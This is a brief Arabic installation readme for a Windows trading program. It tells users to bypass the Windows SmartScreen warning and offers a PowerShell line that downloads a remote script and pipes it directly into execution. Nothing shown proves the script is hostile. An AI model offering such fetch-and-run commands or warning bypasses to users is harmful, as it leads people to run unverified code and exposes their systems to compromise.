NAJJAR Trading · Windows v70.5.2

1) فك الضغط عن المجلد
2) اضغط مرتين: 1-تثبيت-الآن.bat
3) إذا ظهر تحذير Windows: مزيد من المعلومات → تشغيل على أي حال

أو من PowerShell (تثبيت تلقائي):
irm https://web-production-08d73.up.railway.app/releases/windows/install.ps1 | iex

بعد التثبيت تظهر على سطح المكتب: NAJJAR Trading
